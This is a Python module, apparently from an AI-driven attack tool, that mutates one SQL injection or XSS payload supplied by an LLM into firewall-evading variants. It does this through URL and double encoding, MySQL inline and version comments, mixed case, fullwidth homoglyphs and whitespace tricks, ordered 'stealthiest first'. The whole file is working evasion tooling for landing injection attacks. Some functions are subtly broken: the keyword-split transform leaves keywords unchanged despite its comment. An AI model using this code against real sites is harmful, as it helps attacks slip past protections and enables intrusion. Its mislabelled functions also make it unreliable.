"""Payload mutation - generate WAF-bypass variants of a single seed payload.

Philosophy: we do NOT ship thousands of hardcoded payloads. We ship a small set
of *transforms* that a WAF's normalizer may miss but the target's parser will
still honor. The LLM supplies ONE semantic payload (e.g. the SQLi/XSS it wants
to land); this module produces ordered variants, cheapest/stealthiest first.

Each transform is deterministic and reversible-in-intent: the mutated string is
meant to be parsed identically by the *backend* while evading naive signature or
regex matching at the *WAF*.
"""
from __future__ import annotations

import random
import urllib.parse
from dataclasses import dataclass
from typing import Callable, Iterable


@dataclass
class Variant:
    payload: str
    technique: str      # human/LLM-readable label of what was applied
    context: str        # where it's meant to go: url, body, header, path


# ---- primitive transforms -------------------------------------------------

def _identity(p: str) -> str:
    return p


def _url_encode(p: str) -> str:
    return urllib.parse.quote(p, safe="")


def _double_url_encode(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def _mixed_case(p: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))


def _sql_comment_ws(p: str) -> str:
    # replace spaces with inline comments - classic MySQL/generic bypass
    return p.replace(" ", "/**/")


def _sql_version_comment(p: str) -> str:
    # MySQL executes /*!...*/ ; many WAF regexes ignore comment bodies
    return p.replace(" ", "/*!50000 */")


def _unicode_overlong(p: str) -> str:
    # overlong / fullwidth homoglyphs for common breakers
    table = {"'": "＇", "<": "＜", ">": "＞", "(": "（", ")": "）"}
    return "".join(table.get(c, c) for c in p)


def _tab_split(p: str) -> str:
    return p.replace(" ", "\t")


def _newline_split(p: str) -> str:
    return p.replace(" ", "\n")


def _null_pad(p: str) -> str:
    return p.replace(" ", "%00 ") if "%" in p else p


def _html_entity(p: str) -> str:
    table = {"<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&#34;"}
    return "".join(table.get(c, c) for c in p)


def _case_keyword_break(p: str) -> str:
    # break common SQL/XSS keywords so signature regex misses them, backend still parses
    for kw in ("SELECT", "UNION", "SCRIPT", "ALERT", "OR", "AND", "FROM"):
        low = kw.lower()
        for form in (kw, low):
            if form in p:
                p = p.replace(form, form[: len(form) // 2] + form[len(form) // 2 :])
    return p


# Ordered: stealthiest/most-likely-to-parse first.
_TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
    ("raw", _identity),
    ("mixed_case", _mixed_case),
    ("url_encode", _url_encode),
    ("sql_inline_comment", _sql_comment_ws),
    ("tab_whitespace", _tab_split),
    ("mysql_version_comment", _sql_version_comment),
    ("double_url_encode", _double_url_encode),
    ("html_entity", _html_entity),
    ("newline_whitespace", _newline_split),
    ("unicode_homoglyph", _unicode_overlong),
    ("keyword_split", _case_keyword_break),
    ("null_pad", _null_pad),
]


def mutate(
    payload: str,
    context: str = "url",
    techniques: Iterable[str] | None = None,
    limit: int = 12,
    seed: int | None = None,
) -> list[Variant]:
    """Produce ordered, de-duplicated bypass variants of `payload`.

    techniques: optional subset of transform names to restrict to.
    limit: max variants returned.
    """
    wanted = set(techniques) if techniques else None
    out: list[Variant] = []
    seen: set[str] = set()
    transforms = list(_TRANSFORMS)

    # Layer two-step combos for the harder WAFs (encode after structural change).
    combos: list[tuple[str, Callable[[str], str]]] = [
        ("comment+urlenc", lambda p: _url_encode(_sql_comment_ws(p))),
        ("case+comment", lambda p: _sql_comment_ws(_mixed_case(p))),
    ]

    for name, fn in transforms + combos:
        if wanted and name not in wanted:
            continue
        try:
            mutated = fn(payload)
        except Exception:
            continue
        if mutated in seen:
            continue
        seen.add(mutated)
        out.append(Variant(payload=mutated, technique=name, context=context))
        if len(out) >= limit:
            break

    if seed is not None:
        rng = random.Random(seed)
        rng.shuffle(out)
    return out
